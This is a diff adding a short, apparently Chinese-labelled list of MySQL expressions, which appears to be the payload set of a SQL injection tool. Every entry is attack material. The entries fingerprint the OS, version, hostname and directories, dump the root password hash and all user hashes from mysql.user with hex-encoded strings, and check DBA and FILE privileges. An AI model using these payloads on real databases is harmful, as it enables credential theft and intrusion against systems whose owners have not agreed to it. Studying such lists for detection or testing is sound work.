@@ -1,0 +1,14 @@
+操作系统：@@version_compile_os
+数据库版本：version()
+当前数据库：database()
+当前用户：user()
+主机名称：@@hostname
+安装目录：@@basedir
+数据目录：@@datadir
+RootHash[password]：(select password from mysql.user where User=0x726F6F74 limit 0,1)
+RootHash[authentication_string]：(select cast(authentication_string as char(50)) from mysql.user where User=0x726F6F74 limit 0,1)
+是否DBA：(select if(count(*)>0,1,0) from mysql.user where user=substring_index(user(),0x40,1) and Super_priv=0x59)
+全部用户Hash[5.7+]：(select group_concat(concat_ws(0x3a,User,cast(authentication_string as char(100))) separator 0x0a) from mysql.user)
+全部用户Hash[5.6-]：(select group_concat(concat_ws(0x3a,User,password) separator 0x0a) from mysql.user)
+当前用户权限：(select group_concat(distinct privilege_type separator 0x0a) from information_schema.user_privileges where grantee=concat(0x27,replace(current_user(),0x40,0x274027),0x27))
+FILE读写权限：(select if(count(*)>0,0x59,0x4e) from mysql.user where user=substring_index(user(),0x40,1) and file_priv=0x59)
